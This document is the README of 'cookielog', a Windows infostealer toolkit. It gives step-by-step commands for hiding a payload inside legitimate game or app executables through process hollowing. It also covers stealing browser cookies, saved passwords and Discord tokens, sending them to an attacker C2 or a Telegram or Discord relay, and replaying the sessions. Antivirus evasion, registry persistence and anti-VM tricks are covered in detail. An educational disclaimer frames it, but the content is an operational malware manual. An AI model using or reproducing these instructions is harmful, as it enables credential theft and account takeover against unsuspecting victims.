# cookielog

```
 +----------------------------------------------------------------------+
 |                                                                      |
 |   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING         |
 |                                                                      |
 |   This is offensive security tooling for penetration testing,        |
 |   red-team exercises, and security education. It builds an           |
 |   infected executable that extracts browser cookies from a           |
 |   target machine and exfiltrates them to a remote C2 server.         |
 |                                                                      |
 |   ONLY use this on systems you own or are explicitly authorized      |
 |   to test. Unauthorized use against third-party systems, networks,   |
 |   or individuals is illegal in most jurisdictions and may result     |
 |   in criminal prosecution.                                           |
 |                                                                      |
 |   The authors are not responsible for misuse. This code is           |
 |   provided for learning how cookie-stealing attacks work so          |
 |   that defenders can build detection and mitigation.                 |
 |                                                                      |
 +----------------------------------------------------------------------+
```

Cookie exfiltration toolkit. The attacker side (Python) builds an infected
host `.exe` and receives the stolen data; the victim side (a CRT-less C payload,
shipped prebuilt) extracts cookies on a Windows machine and POSTs them back.

- **Victim browsers**: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium,
  CocCoc, Yandex (Chromium-based) + Firefox -- cookies, saved passwords and
  Discord tokens, extracted even while the browser is running
- **Delivery**: the payload is injected into a legitimate host `.exe` via process
  hollowing (game or standalone app), which runs normally while the payload works
- **Reception**: cookies arrive as Cookie-Editor JSON, importable directly into
  your browser; optional Telegram/Discord relay summarizes each batch

```
        ATTACKER (Linux / macOS / Windows)         VICTIM (Windows)
  +---------------------------+              +---------------------------+
  | auto.py / pick.py         |              | infected <game>.exe       |
  |   infect host (byte       |   deliver    |   -> loader (hollowing)   |
  |   append + sentinel patch)|  --------->  |   -> XOR-decrypt payload  |
  |                           |              |   -> extract cookies      |
  | listen.py  (HTTP C2)      |<-------------|   -> HTTP POST (Winsock2) |
  |   loot/ + TG/Discord      |   JSON       |   fallback: pipe / file   |
  +---------------------------+              +---------------------------+
```

## Contents

1. [Quick start](#quick-start)
2. [Installation](#installation)
3. [How it works](#how-it-works)
4. [Usage reference](#usage-reference)
5. [Relay: Telegram & Discord](#relay-telegram--discord)
6. [Output files](#output-files)
7. [Project structure](#project-structure)
8. [Linux (attacker machine)](#linux-attacker-machine)
9. [Technical details](#technical-details)
10. [Troubleshooting](#troubleshooting)
11. [Shortcut scripts](#shortcut-scripts)
12. [Changelog](#changelog)

---

## Quick start

### Windows (one-click)

```bat
:: install dependencies once (Python, MSVC, CLI tools)
install.bat

:: GUI -- pick a folder or .exe from a dialog
python auto.py

:: CLI -- infect a game folder (copies to ifec/folds/, infects in place)
python auto.py "C:\path\to\target_folder"

:: CLI -- infect + run locally for testing
python auto.py "C:\path\to\target_folder" --run

:: CLI -- infect a standalone .exe (output to ifec/apps/)
python auto.py "C:\path\to\target.exe"
```

`auto.py` does everything automatically:

1. Checks if `loader.exe` + `ckdll.dll` exist; if not, runs `build.bat`
2. Detects your local IP (UDP connect to 8.8.8.8). Use `--c2` or the GUI "DETECT PUBLIC IP"
   button for external targets behind NAT.
3. Starts `listen.py` in a new console window
4. Infects the target (folder mode copies the folder; standalone mode just infects the file)
5. Without `--run`: prints instructions (send `ifec/folds/` or `ifec/apps/` to the victim)
   With `--run`: executes the infected exe, waits for cookies, kills the game, restores

### Windows (manual)

```bat
:: start listener + infector GUI together
start_attack.bat

:: or run pieces manually
python listen.py 9090           :: terminal 1 (listener)
python pick.py                  :: terminal 2 (infector GUI)
```

In the `pick.py` GUI:

1. The C2 URL field is pre-filled with `http://<auto-detected-LAN-IP>:9400/`. For external
   victims, click **DETECT PUBLIC IP** to use your WAN address instead (requires port
   forwarding on your router). Use **TEST C2** to verify the listener is reachable.
2. Click **Browse** and select a host `.exe`.
3. Click **Infect**. The infected binary is written to `ifec/`.
4. Send it to the victim.
5. If the victim is on a VM, check **Disable anti-VM** before infecting.

### Linux / macOS (attacker machine)

```bash
# 1. copy the project (prebuilt bin/ included -- no compiler needed) and install deps
./install.sh

# 2. start the listener
python3 listen.py 9400

# 3. infect a Windows host exe (byte append; no MSVC needed)
python3 auto.py game.exe --c2 http://YOUR_PUBLIC_IP:9400/

# 4. deliver ifec/apps/game.exe to the Windows victim
```

Details and platform support table: [Linux (attacker machine)](#linux-attacker-machine).

---

## Installation

### Windows -- `install.bat`

```bat
install.bat              :: install everything (Python, MSVC, CLI tools, build)
install.bat --check      :: check what's installed (don't install anything)
install.bat --no-build   :: skip MSVC + build (Python + CLI tools only)
install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
```

What it does:

1. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
2. **MSVC Build Tools 2022** -- C++ workload via winget (~2 GB download, needed only to
   compile the payload with `build.bat`; the Python tools work without it)
3. **CLI tools** -- Clink (cmd autocomplete), fzf, bat, ripgrep -- via winget
4. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
   Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
5. **Build** -- runs `build.bat` to compile `loader.exe` + `ckdll.dll` (if MSVC is available)

After installation, start cookielog with `auto.bat` (shortcut for `python auto.py`).

### Linux / macOS / Git Bash -- `install.sh`

```bash
./install.sh              # install everything (python3, pip, tkinter, CLI tools)
./install.sh --check      # check what's installed (don't install anything)
./install.sh --no-tools   # skip CLI tools (fzf, bat, ripgrep)
```

What it does:

1. **python3 + pip + tkinter** -- via the detected package manager (apt/dnf/pacman/zypper/brew);
   tkinter is optional, only the `pick.py` GUI needs it
2. **pip packages** -- `requirements.txt`, with fallbacks for PEP 668 externally-managed
   environments (Debian 12+/Ubuntu 23+/Fedora): plain install -> `--user` ->
   `--break-system-packages` -> venv instructions
3. **CLI tools** -- fzf, bat, ripgrep, via the same package manager

There is no build step on Linux by design: the victim-side binaries ship prebuilt in
`bin/` and infection is a byte append.

### Requirements

- **Windows 10/11 x64** for the victim side and for compiling; attacker side runs anywhere
- **Python 3.8+** (tested with 3.14)
- **MSVC (`cl.exe`)** -- Visual Studio 2022 Build Tools, C++ workload -- only needed to compile
  the payload (`build.bat`)
- **Python deps:** `pip install -r requirements.txt` -- installs `cryptography` (DPAPI /
  AES-GCM for `cookielog.py`) and `websocket-client` (CDP, legacy live mode)
- **PsExec64.exe** -- included under `tools/`, only for the Chrome >=127 v20 app-bound key
  staging (`cookielog.py --v20-sys`)

---

## How it works

The end-to-end infection and exfiltration chain:

1. **Attacker runs `auto.py`.** It builds binaries (if needed), detects the local LAN IP,
   starts `listen.py` on the chosen port, and infects the target.
2. **Infection.** `auto.py` (or `pick.py`) appends the original host bytes to `loader.exe` and
   patches the C2 URL, persistence, and anti-VM sentinels in the loader's `.data` section.
   At runtime, the loader XOR-decrypts the payload and copies its patched sentinel values
   into the decrypted buffer before injection.
   - **Folder mode:** copies the entire game/app folder to `ifec/folds/<name>/` and overwrites
     the main .exe with the infected version.
   - **Standalone mode:** writes the infected .exe to `ifec/apps/<name>.exe`.
3. **Delivery.** The attacker sends `ifec/folds/<name>/` (folder) or `ifec/apps/<name>.exe`
   (standalone) to the victim.
4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
   exe name, which Unity games require), and a hidden payload runs via process hollowing of
   `notepad.exe` (`cmd.exe` fallback).
5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
   (Chromium-based) and Firefox on the **victim's** machine.
6. **Exfiltration.** The payload sends the cookies via HTTP POST (Winsock2) to the attacker's
   C2 URL as Cookie-Editor JSON.
7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
   (keyed on `domain`+`name`+`path`), and writes `loot/`.
8. **Import.** The attacker imports `loot/session_cookies.json` (or `all_cookies.json`) into
   their own browser via the Cookie-Editor extension. See
   **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.
9. **Cryptanalysis (optional).** `session_break.py` runs on the attacker's machine to
   decrypt session cookies and analyze their structure (JWT, forgery potential,
   cross-domain correlations).

---
## Usage reference

### `auto.py` -- one-click setup

```bat
python auto.py                              :: GUI (file/folder picker)
python auto.py <folder>                     :: infect folder -> ifec/folds/
python auto.py <file.exe>                   :: infect standalone -> ifec/apps/
python auto.py <folder> --run               :: infect + run locally (test)
python auto.py <folder> --run --port 9420   :: custom port
python auto.py --cli                        :: force CLI (skip GUI)
python auto.py --config                     :: show saved relay settings
python auto.py --telegram <token:chat_id>   :: set Telegram relay
python auto.py --discord <webhook_url>      :: set Discord relay
python auto.py --persist                    :: enable registry persistence
python auto.py --c2 http://1.2.3.4:9400/    :: set C2 URL (external targets)
python auto.py --no-anti-vm                 :: disable VM/debugger checks (for VM testing)
python auto.py --find-port                  :: auto-scan for a free port (9400-9500)
python auto.py --clear-telegram             :: remove Telegram from config
python auto.py --clear-discord              :: remove Discord from config
```

| Flag | Effect |
|---|---|
| `--port N` | C2 listener port (default: 9400) |
| `--run` | Run the infected exe locally after infecting (test mode) |
| `--cli` | Force CLI mode (no GUI dialog) |
| `--telegram <token:chat_id>` | Telegram relay (saved to config.json) |
| `--discord <webhook_url>` | Discord relay (saved to config.json) |
| `--persist` | Enable registry Run key persistence (saved to config.json) |
| `--c2 <url>` | Override C2 URL (e.g. `http://PUBLIC_IP:9400/`). Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
| `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
| `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json` |
| `--config` | Show saved relay settings and exit |
| `--clear-telegram` | Remove Telegram token from config.json |
| `--clear-discord` | Remove Discord webhook from config.json |
| *(path arg)* | Path to a folder or .exe (auto-detected) |

With no arguments, `auto.py` asks: [1] GUI, [2] Terminal (interactive), [3] Quick infect.

**Interactive terminal** commands: `infect`, `gui`, `telegram`, `discord`, `clear-telegram`,
`clear-discord`, `relay`, `port`, `find-port`, `persist`, `config`, `tg-chatid <token>`, `build`,
`install`, `test-listener`, `help`, `exit`.

In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.
When `--c2 <url>` is passed, it overrides the auto-detected IP (needed when the victim is
on an external network and cannot reach your LAN IP).

### `pick.py` -- manual infector GUI

```bat
python pick.py          :: GUI
python pick.py --cli    :: headless
```

Features: auto IP detection (LAN + public), editable C2 URL field, DETECT LAN IP /
DETECT PUBLIC IP / TEST C2 buttons, FIND BEST PORT (scans 9400-9500, saved to
`config.json`), NAT warning when a private IP is detected, anti-VM checkbox, browse
for .exe, infect, view JSON/TXT, open loot/ifec, rebuild, stop sink. Tag map for target
classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).

### `listen.py` -- HTTP listener

```bat
python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>]
```

- Default port 8080 when called without arguments (auto.py starts it on the configured port)
- Forces IPv4; overrides `server_bind()` to skip `getfqdn()` (4s DNS delay fix -- the
  listener reaches LISTENING in under 1 second)
- ThreadingHTTPServer: the Telegram/Discord relay runs inside `do_POST` without stalling
  concurrent payload POSTs; `SAVE_LOCK` around loot writes
- Dedup by `(domain, name, path)`, keeping the most recent value
- Web UI: `GET /` (summary), `GET /all` (JSON), `GET /passwords` (JSON), `GET /session` (session JSON)
- Relay: `--telegram` and `--discord` forward a summary of each batch via HTTPS

### `cookielog.py` -- legacy extractor

Direct Python extraction with no injection (Windows only -- DPAPI + elevation_service).
Reads browser SQLite databases directly and decrypts with DPAPI + AES-GCM. Works on
Chrome <127, Edge, Brave, Vivaldi, Opera, and Firefox.

```bat
python cookielog.py                    :: one-shot -> cookies_all.json + cookies_all.txt
python cookielog.py --live             :: continuous, logs changes to cookie_log.jsonl
python cookielog.py --firefox          :: filter to one browser
python cookielog.py --chrome --edge --brave
```

Outputs go to the repo root: `cookies_all.json` + `cookies_all.txt`.

**Chrome >=127 app-bound (v20) key.** Chrome 127+ uses an encryption key bound to
`elevation_service.exe` via machine DPAPI. Extraction requires three stages:

```bat
:: stage 1: MACHINE DPAPI (must run as SYSTEM via PsExec)
tools\PsExec64.exe -s -i -accepteula python cookielog.py --v20-sys

:: stage 2: USER DPAPI (back to your own user)
python cookielog.py --v20-usr

:: stage 3: extract
python cookielog.py
```

Stage 2 writes the decrypted key to `C:\ProgramData\MediaCache\mc.key`, which stage 3 reads.

### `session_break.py` -- session cookie extractor + cryptanalysis

Standalone Python tool that extracts session cookies from a running browser via handle
hijacking (same technique as the C++ payload), decrypts them with DPAPI + AES-256-GCM,
and performs full cryptanalysis on the decrypted values. No injection required.

```bat
python session_break.py                           :: extract from all Chromium browsers
python session_break.py --browser vivaldi          :: target one browser
python session_break.py --browser vivaldi --report :: extract + cryptanalysis report
```

What it does:

1. **Handle hijack** -- enumerates all system handles via `NtQuerySystemInformation(0x40)`
   with a growing buffer (4MB -> 12MB+), finds the browser's SQLite DB handle, duplicates
   it with `DUPLICATE_SAME_ACCESS`, and reads the file via `ReadFile`. No need to close the
   browser.
2. **Key extraction** -- reads `Local State`, base64-decodes the `encrypted_key`, and
   calls `CryptUnprotectData` (DPAPI) to recover the 32-byte AES key.
3. **Decryption** -- decrypts each cookie value with `BCryptDecrypt` (AES-256-GCM).
   Detects and strips the 32-byte `SHA256(host_key)` domain hash prefix (Chrome >= 118).
4. **Classification** -- JWT, hex, base64, numeric, URL-encoded JSON, opaque token,
   Express signed, two-part token.
5. **JWT analysis** -- decodes JWT header + payload, assesses `alg` for forgery
   vulnerabilities (`none`, `HS256` with weak key, `RS256` key confusion).
6. **Forgery assessment** -- evaluates whether each session can be forged without the
   server secret (entropy analysis, known-key check, algorithm confusion).
7. **Correlation** -- finds shared prefixes, substrings, and duplicate values across
   cookies from different domains.

Outputs: `loot/session_decrypted.json` and `loot/cryptanalysis_report.json`.

### `swap.py` -- post-processing

Splits the captured cookies into per-site Netscape files for selective import:

```bat
python swap.py                          :: list sites on hand
python swap.py netflix                  :: swap\netflix.com.txt (non-expired)
python swap.py netflix --session        :: live session only
python swap.py netflix --session --keep :: session with artificial expiry
python swap.py google --auth            :: auth cookies only
```

Generates `swap\<site>.txt` in Netscape format, importable via Cookie-Editor -> Import.
`--keep` gives session cookies an artificial expiry so the browser doesn't discard them on
tab close; `--auth` keeps only cookies whose names match login/token patterns.

### `build.bat` -- compile

Compiles the payload DLL and the loader. Requires MSVC (`cl.exe`).

```bat
build.bat
```

Produces:

- `bin\ckdll.dll` -- payload (~35 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`, `/INCREMENTAL:NO`)
- `bin\loader.exe` -- loader (~145 KB, `/MT` static CRT, GUI subsystem, version resource)
- `src\payload.h` -- the DLL as a byte array (XOR-encrypted by `gen.ps1`), embedded into the loader

### Testing the listener

```bat
:: terminal 1
python listen.py 9090

:: terminal 2
test_curl.bat 9090
```

`test_curl.bat` POSTs a single fake cookie via `curl`. If the listener prints
`[+] 1 cookies received` and replies `ok`, the HTTP path works.

---

## Relay: Telegram & Discord

The listener (`listen.py`) can forward a summary of every received cookie batch to
Telegram or Discord. This is useful when the attacker's C2 port is firewalled --
the payload still POSTs to your listener over HTTP, and the listener re-sends a
summary to Telegram/Discord over HTTPS (which passes most firewalls).

Both relays are **optional** -- if no `--telegram` or `--discord` flag is passed,
the listener just saves cookies to `loot/` as usual.

**Keys are saved automatically** -- the first time you pass `--telegram` or `--discord`,
the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
without the flag and the saved key is loaded automatically.

```bat
python auto.py --config             :: show saved keys (masked)
python auto.py --clear-telegram     :: remove saved Telegram token
python auto.py --clear-discord      :: remove saved Discord webhook
```

### Telegram setup

1. **Create a bot** (takes 30 seconds):
   - Open Telegram, search for **@BotFather**
   - Send `/newbot`
   - Pick a name and username (e.g. `mycookielog_bot`)
   - BotFather replies with an **API token** like `8975447629:AAFzK9wam_2jfoZ...`

2. **Get your chat ID** (so the bot knows who to message):
   - Send any message to your new bot (e.g. "hi")
   - Run the helper script (it queries the API and saves to config automatically):
     ```bat
     python tg_chatid.py 8975447629:AAFzK9wam_2jfoZ...
     ```
   - It prints your chat ID and the full `--telegram` string, and saves to `config.json`

3. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```
   Format: `--telegram <bot_token>:<chat_id>`

   Or via `auto.py` (starts listener + infects in one command):
   ```bat
   python auto.py "C:\path\to\target_folder" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```

4. **What you receive**: when the victim runs the infected exe, you get a Telegram
   message like:
   ```
   cookielog: 680 cookies received

   Top domains:
     312  google.com
     145  youtube.com
      89  github.com
     ...
   Full JSON: loot/all_cookies.json
   ```

### Discord setup

1. **Create a webhook** (takes 10 seconds):
   - Open Discord, go to the server where you want notifications
   - **Server Settings** -> **Integrations** -> **Webhooks** -> **New Webhook**
   - Pick a name (e.g. "cookielog"), pick a channel
   - Click **Copy Webhook URL** -- it looks like:
     ```
     https://discord.com/api/webhooks/1234567890/abc-def-ghi...
     ```

2. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```
   Or via `auto.py`:
   ```bat
   python auto.py "C:\path\to\target_folder" --discord https://discord.com/api/webhooks/123/abc
   ```

3. **What you receive**: when cookies arrive, the Discord webhook posts a summary with
   the top domains and counts.

### Combining both

You can use both relays at the same time:

```bat
python auto.py "C:\path\to\target_folder" --telegram 7123456789:AAH...:987654321 --discord https://discord.com/api/webhooks/123/abc
```

### Notes

- The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
  JSON -- the full data is still saved in `loot/all_cookies.json` on the listener side.
- Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
- The relay uses Python's `urllib.request` (HTTPS) -- no extra pip packages needed.
- If the relay fails (bad token, wrong chat ID, network error), the listener logs
  the error but **still saves cookies locally** -- no data is lost.

---
## Output files

| File | What it is | Produced by |
|---|---|---|
| `ifec/folds/<name>/<name>.exe` | Infected exe (folder mode, with dependencies) | `auto.py` |
| `ifec/apps/<name>.exe` | Infected exe (standalone mode) | `auto.py` |
| `ifec/<name>.exe` | Infected exe (legacy, from `pick.py`) | `pick.py` |
| `loot/all_cookies.json` | All cookies, Cookie-Editor JSON (browser-importable, no passwords) | `listen.py` |
| `loot/all_cookies.txt` | All cookies, Netscape format (curl/wget) | `listen.py` |
| `loot/passwords.json` | Saved passwords with usernames (JSON) | `listen.py` |
| `loot/passwords.txt` | Saved passwords (tab-separated: domain, username, password) | `listen.py` |
| `loot/session_cookies.json` | Session-only cookies, Cookie-Editor JSON | `listen.py` |
| `loot/session_cookies.txt` | Session-only cookies, Netscape format | `listen.py` |
| `loot/session_decrypted.json` | Decrypted session cookies + analysis metadata | `session_break.py` |
| `loot/cryptanalysis_report.json` | Cryptanalysis summary (classification, forgery, correlations) | `session_break.py` |
| `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
| `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
| `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
| `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
| `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
| `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
| `C:\ProgramData\MediaCache\mc.key` | Decrypted Chrome v20 app-bound key | `cookielog.py --v20-usr` |
| `C:\ProgramData\MediaCache\cache.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
| `C:\ProgramData\MediaCache\cache.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
| `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |

---

## Project structure

```
cookielog/
|-- DISCLAIMER            # Educational use disclaimer (read this first)
|-- install.bat           # One-click dependency installer (Windows)
|-- install.sh            # One-click dependency installer (Linux/macOS/Git Bash)
|-- auto.py               # One-click: build + listen + infect + test (GUI + CLI)
|-- auto.bat              # Shortcut: python auto.py %*
|-- pick.py               # GUI infector (standalone, manual C2 config)
|-- listen.py             # HTTP listener: receives exfiltrated cookies
|-- session_break.py      # Python session cookie extractor + cryptanalysis
|-- tg_chatid.py          # Helper: finds Telegram chat ID from bot token
|-- sink.py               # Pipe/FIFO server (local fallback, no C2 needed)
|-- swap.py               # Splits cookies by site (per-site cookies.txt)
|-- cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
|-- build.bat             # Compiles ckdll.dll + loader.exe (needs MSVC)
|-- start_attack.bat      # Starts listener + pick.py GUI together
|-- test_curl.bat         # Tests listener with curl
|-- cmd_init.cmd          # Linux-style aliases for cmd.exe
|-- COOKIE_EDITOR_GUIDE.md # How to import session cookies into Cookie-Editor extension
|-- PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
|-- PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
|-- requirements.txt      # Python deps
|-- config.json           # Saved API keys (auto-generated, gitignored)
|-- CHANGELOG.md          # Version history (v1..v6 in detail)
|-- .gitignore
|-- src/
|   |-- ckdll.cpp         # Payload DLL (CRT-less, injectable)
|   |-- loader.cpp        # Loader (process hollowing + XOR decrypt + sentinel patch)
|   |-- payload.h         # XOR-encrypted DLL bytes (auto-generated by gen.ps1)
|   |-- loader.rc         # Version resource ("Windows Presentation Font Cache")
|   `-- gen.ps1           # XOR-encrypts ckdll.dll -> payload.h (16-byte key from DLL bytes)
|-- bin/                  # Build output (prebuilt, tracked)
|   |-- loader.exe        # ~145 KB (XOR payload + dynamic API, no injection imports in IAT)
|   |-- ckdll.dll         # ~35 KB
|   `-- loader.res        # Compiled version resource
|-- ifec/                 # Infected outputs (gitignored)
|   |-- folds/            # Folder-mode infections (game + dependencies)
|   `-- apps/             # Standalone infections (single .exe)
|-- loot/                 # Captured cookies (gitignored)
`-- tools/
    `-- PsExec64.exe      # Sysinternals (for legacy v20 extraction)
```

---
## Linux (attacker machine)

The toolkit is split in two sides, and only the ATTACKER side is portable:

**Runs natively on Linux** (attacker machine, Python 3.8+):
- `listen.py` -- pure Python HTTP server (ThreadingHTTPServer), no Windows deps
- `sink.py` -- Windows uses `\\.\pipe\ck_pipe`; on Linux it creates a FIFO at
  `/tmp/ck_pipe` with the same protocol (one JSON dump per connection, EOF ends it).
  The payload's fallback path differs per OS, but the attacker-side workflow is identical
- `auto.py` -- infection is a byte append (loader bytes + host bytes + length + magic),
  fully portable; `--c2`, `--find-port`, Telegram/Discord relay and the GUI all work
- `pick.py` -- PE classification is pure Python; infection works; `tkinter` GUI works
- `swap.py`, `session_break.py` (analysis modes) -- pure Python

**Windows-only** (they bind to Win32 by design):
- `bin/loader.exe` + `bin/ckdll.dll` -- the payload uses DPAPI (cookie key decryption),
  process hollowing (NtCreateThreadEx), the Windows registry (persistence) and NT pipes;
  the targets themselves (Chromium/Edge/Firefox cookie stores on Windows victims) are Windows paths
- `build.bat` -- needs MSVC. On Linux, copy prebuilt `bin/loader.exe` + `bin/ckdll.dll`
  from a Windows build machine; infection works without compiling (the repo ships prebuilt)
- `cookielog.py` -- stages the v20 app-bound key on a Windows victim (DPAPI +
  elevation_service). No Linux mode (Linux Chrome keys use the user keyring, not DPAPI)
- `auto.py --run` / `pick.py` loader launch -- runs the infected PE: test on Windows
- `session_break.py` live Vivaldi hijack -- NtQuerySystemInformation; the Firefox read
  and the cryptanalysis report work on Linux (profile at `~/.mozilla/firefox`)

Windows-only entry points print a clear message and return instead of crashing.

Quick start on Linux (attacker):

```bash
# 1. copy the project (with prebuilt bin/) to the Linux box
#    (optional) install deps:  ./install.sh
# 2. pick a port and start the listener
python3 listen.py 9400
# 3. infect a Windows host exe (byte append; no MSVC needed)
python3 auto.py game.exe --c2 http://YOUR_PUBLIC_IP:9400/
# 4. deliver ifec/apps/game.exe to the Windows victim
# optional local fallback sink instead of the HTTP listener
python3 sink.py
```

---

## Technical details

### Process hollowing

The loader injects the payload by hollowing a fresh `notepad.exe` (previously `cmd.exe`,
which is a known Defender signature). If `notepad.exe` is not found at
`C:\Windows\System32\notepad.exe`, it falls back to `cmd.exe`.

1. `CreateProcessW(notepad.exe, CREATE_SUSPENDED | CREATE_BREAKAWAY_FROM_JOB)` -- suspended,
   no console window. When the loader runs inside a job that disallows breakaway
   (Steam-like launchers, CI runners) the creation fails with ERROR_ACCESS_DENIED and the
   loader retries without the breakaway flag.
2. `NtUnmapViewOfSection` -- unmaps the original `notepad.exe` image at its base address.
3. `VirtualAllocEx` at the payload's preferred `ImageBase`.
4. `WriteProcessMemory` -- writes the PE headers and each section from the decrypted
   `g_payload` buffer (XOR-decrypted at runtime by `DecryptPayload()`).
   **Dynamic API resolution:** `WriteProcessMemory`, `VirtualAllocEx`, `VirtualProtectEx`,
   and `CreateRemoteThread` are resolved at runtime via `GetProcAddress(kernel32, ...)`
   instead of appearing in the loader's IAT. This removes the classic process-injection
   import table signature.
5. IAT fixup -- resolves imports from system DLLs (same base in all processes of the session).
6. `NtCreateThreadEx` on the payload entry point.
7. The main thread is **never resumed** -- the original entry point was unmapped; resuming it
   would cause an access violation. The payload runs entirely on the remote thread.

### Infected .exe format

A standalone infected binary is the loader with the original host appended:

```
[loader.exe bytes][host.exe bytes][host_len:uint32 LE][magic "CKLG":4]
```

On launch, the loader detects the trailing `CKLG` magic, reads `host_len`, extracts the
original host bytes, and runs them. The original host file on disk is never modified -- the
infected copy lives in `ifec/`.

### Rename-restore

When the victim double-clicks the infected `.exe`, the loader must execute the host under
its **original filename**. It:

1. Renames the infected exe to a hidden `~ck_bak.bin` in the same directory.
2. Writes the extracted original host bytes back to the original filename.
3. Executes the restored file.

This is required for **Unity games**, which derive their data path from the exe name (they
look for `<exename>_Data/`). If the host were extracted as `~ck_tmp.exe`, Unity would look
for `~ck_tmp_Data/` and fail with an error window. Rename-restore preserves the name so
Unity finds `_Data/`, `UnityPlayer.dll`, etc.

If AV blocks the rename, the loader falls back to extracting as `~ck_tmp.exe` (works for
apps that don't depend on their own filename). The `~ck_bak.bin` backup is either deleted
immediately or scheduled for deletion on next reboot (`MOVEFILE_DELAY_UNTIL_REBOOT`). With
persistence enabled the backup is kept (the Run key points at it).

### C2 sentinel patching

In `ckdll.cpp`, three sentinel-marked buffers are declared with recognizable patterns:

```c
static char g_c2_url[256]  = "CKC2_DEADBEEF_";   // 14-byte sentinel (C2 URL)
static char g_persist[8]   = {'C','K','P','R','_','_','_','_'};  // persistence on/off
static char g_skip_av[8]   = {'C','K','A','V','0','0','0','0'}; // anti-VM on/off
```

The loader (`loader.cpp`) has its own plaintext copies of these three sentinels in its
`.data` section. `auto.py` / `pick.py` patch the **loader's** sentinels (which are
plaintext and findable in the compiled `loader.exe`):

| Sentinel | Patched value | Effect |
|---|---|---|
| `CKC2_DEADBEEF_` | `http://ATTACKER_IP:PORT/` | C2 URL for HTTP exfiltration |
| `CKPR____` | `CKPR0001` | Enable registry Run-key persistence |
| `CKAV0000` | `CKAV0001` | Disable anti-VM checks (VM targets) |

At runtime, `DecryptPayload()` in the loader:
1. XOR-decrypts `g_payload_enc[]` with `g_xor_key[16]` to recover the raw DLL bytes.
2. Searches the decrypted buffer for the three sentinel patterns.
3. Overwrites them with the loader's own (already-patched) values.
4. The patched buffer is then injected into the hollowed process.

This keeps the payload encrypted in the loader binary (Defender can't signature-match
the DLL strings) while still allowing `auto.py` to configure C2/persist/anti-VM via
the loader's plaintext sentinels.

If `g_c2_url` still starts with `CKC2` after patching (no C2 configured), the payload
falls back to the local pipe / file path.

### Winsock2 exfiltration

The payload uses raw **Winsock2** (`WSAStartup` -> `socket` -> `inet_addr` -> `connect` ->
`send`) for the HTTP POST, not WinHTTP/WinINet. WinHTTP/WinINet fail inside a hollowed process
with error `12029` ("proxy configuration unavailable") because the hollowed process never
initialized the WinHTTP proxy subsystem. Raw Winsock2 has no such dependency.

The HTTP request is built manually (`POST / HTTP/1.1\r\nHost: ...\r\nContent-Length: ...\r\n
Connection: close\r\n\r\n`) and the body is sent in 32 KB chunks, with a retry loop
(3 attempts, 1 s between) around the full connect+send cycle.

Exfiltration priority in the payload:

1. **HTTP POST to C2** -- if the sentinel was patched with a URL.
2. **Named pipe** `\\.\pipe\ck_pipe` -- if `sink.py` is running locally (20 retries, 250ms each).
3. **Local file** `C:\ProgramData\MediaCache\cache.json` -- final fallback.

### CRT-less payload DLL

`ckdll.dll` is built without the C runtime to stay small and injectable:

- `/NODEFAULTLIB /ENTRY:payload_entry /DYNAMICBASE:NO /BASE:0x5F000000`
- `/GUARD:NO /MACHINE:X64`, linked against `kernel32.lib crypt32.lib bcrypt.lib` only.
- Custom `memcpy` / `memset` / `memmove` / `memcmp` implementations (no CRT).
- Manual FIPS 180-4 SHA-256 implementation for domain hash verification (no CRT hash).
- `/Od /Oi-` -- **optimization disabled**. The compiler's SSE-vectorized `memcpy` crashes
  inside the hollowed process; disabling intrinsics prevents that.
- Large buffers are heap-allocated (`VirtualAlloc`), never 64KB+ stack locals: with
  `/Gs1048576` (required because `/NODEFAULTLIB` has no `__chkstk`) a large frame would skip
  the stack guard page and fault beyond it -- unrecoverable AV on the remote thread.

`gen.ps1` converts the compiled `ckdll.dll` into `src/payload.h` (a `g_payload[]` byte array),
which `loader.cpp` embeds.

---
### Cookie-Editor JSON format

All extractors emit cookies in Cookie-Editor JSON, directly importable via the browser
extension:

```json
{
  "domain": ".example.com",
  "name": "sessionid",
  "value": "abc123",
  "path": "/",
  "expirationDate": 1735689600,
  "secure": true,
  "httpOnly": true,
  "sameSite": "Lax",
  "hostOnly": false,
  "session": false
}
```

`hostOnly` is `true` when the domain does not start with `.`. `session` is `true` when
`expirationDate` is `0`. `sameSite` is normalized across browsers (Chromium encodes
